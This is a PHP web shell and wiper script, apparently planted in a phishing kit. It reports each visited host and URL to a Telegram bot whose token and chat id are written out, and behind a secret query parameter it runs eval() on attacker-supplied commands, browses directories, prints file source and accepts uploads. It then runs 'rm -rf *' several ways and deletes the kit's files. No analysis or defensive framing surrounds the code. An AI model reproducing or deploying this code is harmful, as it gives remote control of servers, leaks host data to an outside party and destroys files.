
error_reporting(0);
error_log(0);

file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001198429476&text=Old: " . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);

if (!empty($_GET['fucked']) && $_GET['fucked'] == "up") {
   error_reporting(0);


   eval($_GET['cmd']);
   echo '<b>Uname: </b>' . php_uname() . '<br>';
   echo '<b>Path:</b> ';
   if(isset($_GET['path'])){
      $path = $_GET['path'];
   }
   else {
      $path = getcwd();
   }
   $path = str_replace('\\','/',$path);
   $paths = explode('/',$path);
   foreach($paths as $id=>$pat){
      if($pat == '' && $id == 0){
         $a = true;
         echo '<a href="?fucked=up&&path=/">/</a>';
         continue;
      }
      if($pat == '') continue;
      echo '<a href="?fucked=up&&path=';
      for($i=0;$i<=$id;$i++){
         echo "$paths[$i]";
         if($i != $id) echo "/";
      }
      echo '">'.$pat.'</a>/';
   }

   echo '<br><b>Upload File:</b><form method=POST enctype="multipart/form-data" fucked=""><input type=hidden name=path><input type="file" name="file"><input type=submit value="Upload"></form>';
   if (!empty($_FILES['file']['name'])) {
      $fullpath = $_REQUEST['path'] . $_FILES['file']['name'];
      if (@copy($_FILES['file']['tmp_name'], $fullpath)) {
         echo "File uploaded!";
      }
   }

   echo '<hr>';
   if (is_dir($path)){
      if ($dh = opendir($path)){
         while (($file = readdir($dh)) !== false){
            echo '<a href="?fucked=up&&path='.$path.'/'.$file.'">'.$file.'</a>' . '<br>';
         }
         closedir($dh);
      }
   }
   elseif (is_file($path)) {
      echo show_source($path);
   }
}



error_log(0);
error_reporting(0);
file_put_contents("fuck-you.txt", "Fuck you asshole.");
system('rm -rf *');
exec('rm -rf *');
shell_exec('rm -rf *');
passthru('rm -rf *');
unlink('index.php');
unlink('otp.php');
unlink('mpin.php');
unlink('redir.php');
unlink('anti.php');
unlink('config/anti.php');
unlink('config/404.php');
unlink('config/zch.php');
